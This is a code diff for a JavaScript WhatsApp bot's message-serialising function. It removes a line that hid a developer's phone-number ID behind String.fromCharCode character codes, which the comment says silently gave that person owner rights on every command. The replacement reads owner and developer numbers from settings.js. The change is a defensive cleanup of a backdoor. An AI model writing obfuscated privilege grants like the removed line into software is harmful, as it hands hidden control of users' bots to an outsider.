@@ -413,7 +413,12 @@ async function getCachedGroupMetadata(client, jid) {
 }
 async function Serialize(client, m, store) {
   const botNumber = await client.decodeJid(client.user.id);
-  const botrunning = String.fromCharCode(54, 50, 56, 51, 49, 51, 52, 54, 48, 48, 56, 48, 53, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116);
+  // m.isDeveloper used to be decided by the previous author's number, obfuscated,
+  // which handed him owner rights on every command. Now it follows settings.js.
+  const botrunning = [global.owner, ...(Array.isArray(global.developer) ? global.developer : [])]
+    .map(value => String(value || '').replace(/[^0-9]/g, ''))
+    .filter(Boolean)
+    .map(value => `${value}@s.whatsapp.net`);
   if (!m) return m;
   if (m.key) {
     m.id = m.key.id;
